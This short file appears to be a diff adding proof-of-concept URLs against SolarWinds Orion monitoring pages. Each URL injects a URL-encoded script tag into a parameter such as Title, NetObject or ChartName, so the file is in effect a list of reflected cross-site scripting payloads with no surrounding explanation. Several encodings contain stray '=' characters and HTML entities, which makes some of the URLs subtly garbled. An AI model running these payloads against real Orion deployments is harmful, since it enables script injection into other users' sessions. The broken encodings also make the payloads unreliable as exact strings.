@@ -1,0 +1,7 @@
+http://www.example.com/Orion/NetPerfMon/MapView.aspx?Map=4f89095c-35fa-4b1b-813f-231270=0225b7.OrionMap&amp;Title=%3Cscript%3Ealert%28%27test%27%29%3C/script%3E
+
+http://www.example.com/Orion/NetPerfMon/NodeDetails.aspx?NetObject=%3Cscript%3Ealert%28=%27test%27%29%3C/script%3E
+
+http://www.example.com/Orion/NPM/InterfaceDetails.aspx?NetObject=%3Cscript%3Ealert%28%2=7test%27%29%3C/script%3E&amp;I:100&amp;view=InterfaceDetails
+
+http://www.example.com/Orion/NetPerfMon/CustomChart.aspx?ChartName=%3Cscript%3Ealert%28=%27test%27%29%3C/script%3E&amp;Title=&amp;SubTitle=&amp;SubTitle2=&amp;Width=0&amp;Height=0&amp;NetObject=I:100&amp;CustomPollerID=&amp;Rows=&amp;SampleSize=1M&amp;Period=Yesterday&amp;PlotStyle=&amp;FontSize=1&amp;NetObjectPrefix=I&amp;SubsetColor=&amp;R=YSubsetColor=&amp;ResourceID=57&amp;ShowTrend=True&amp;ReturnTo=
